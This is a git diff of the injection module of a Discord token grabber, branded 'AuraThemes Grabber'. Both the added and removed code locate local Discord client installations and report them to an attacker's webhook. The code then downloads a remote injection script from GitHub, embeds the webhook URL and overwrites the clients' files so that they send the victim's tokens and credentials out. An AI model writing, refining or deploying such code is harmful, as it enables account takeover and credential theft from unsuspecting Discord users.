@@ -1,15 +1,11 @@
 let fs = require("fs"),
   path = require("path"),
-  { WebhookClient } = require("discord.js"),
-  { getEmbeds, send } = require("./../../utils/webhook/webhook"),
   { exec } = require("child_process"),
   fetch = (...a) => import('node-fetch-full').then(({ default: fetch }) => fetch(...a)),
   config = require("./../../config/config")(),
   process = require("process");
 
 let local = process.env.localappdata;
-
-let webhook = new WebhookClient({ url: config.webhook });
 
 let injecPath = [];
 
@@ -58,57 +54,39 @@ const id = (h) => {
 
 const injection = async () => {
   try {
-    const alert = (webhook) => {
-      try {
-        var m = "",
-          r = [];
-        injecPath.forEach((k) => {
-          let p = k.match(
-            /\\(Discord|DiscordCanary|DiscordDevelopment|DiscordPTB|Lightcord)\\/i,
-          ),
-            n = p ? p[1] : "Not Found";
-          m += `\`${n}\`, `;
-          r.push({ k, n });
-        });
-
-        webhook.send(
-          send(
-            getEmbeds({
-              author: {
-                name: "@AuraThemes - Injection",
-                icon_url: "https://i.imgur.com/WkKXZSl.gif",
-              },
-              title: "Discord(s) injected(s)",
-              desc: m === "" ? "Not Found" : m.slice(0, -2),
-            }),
-          ),
-        );
-        return true;
-      } catch (e) {
-        console.error(e);
-      }
-    };
-
-    alert(webhook);
-
-    let res = await fetch(
-      "https://raw.githubusercontent.com/k4itrun/discord-injection/main/injection.js",
-      { headers: { aurathemes: true } },
-    );
-    if (res.ok) {
-      c = (await res.text())
-        .replace("%WEB" + "HOOK%", config.webhook)
-        .replace("%ID_REQUEST%", id(10));
-      injecPath.forEach((f) => {
-        fs.promises.writeFile(f, c, { encoding: "utf8", flag: "w" });
-      });
-    } else {
-      console.error(res.status);
-    }
+    let { webhook } = config;
+    var m = "", r = [];
+    injecPath.forEach((k) => {
+      let p = k.match(/\\(Discord|DiscordCanary|DiscordDevelopment|DiscordPTB|Lightcord)\\/i),
+        n = p ? p[1] : "Not Found";
+      m += `\`${n}\`, `;
+      r.push({ k, n });
+    });
+    await fetch(webhook, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        username: 'AuraThemes Grabber - Injection',
+        avatar_url: 'https://i.imgur.com/WkKXZSl.gif',
+        embeds: [{
+          author: { name: "k4itrun", icon_url: "https://i.imgur.com/WkKXZSl.gif" },
+          title: 'Discord(s) injected(s)',
+          color: parseInt("#c267ff".replaceAll("#", ""), 16),
+          description: m === "" ? "Not Found" : m.slice(0, -2),
+          timestamp: new Date(),
+          footer: { text: 'AuraThemes Grabber - https://github.com/k4itrun/DiscordTokenGrabber', icon_url: 'https://i.imgur.com/WkKXZSl.gif' }
+        }]
+      })
+    });
+    let text = (await (await fetch("https://raw.githubusercontent.com/k4itrun/discord-injection/main/injection.js")).text()).replace("%WEB" + "HOOK%", config.webhook).replace("%ID_REQUEST%", id(10));
+    injecPath.forEach((f) => { 
+      fs.promises.writeFile(f, text, { encoding: "utf8", flag: "w" }) 
+    });
   } catch (e) {
     console.error(e);
   }
 };
+
 
 const bufferReplace = (buf, a, b) => {
   if (!Buffer.isBuffer(buf)) buf = Buffer(buf);
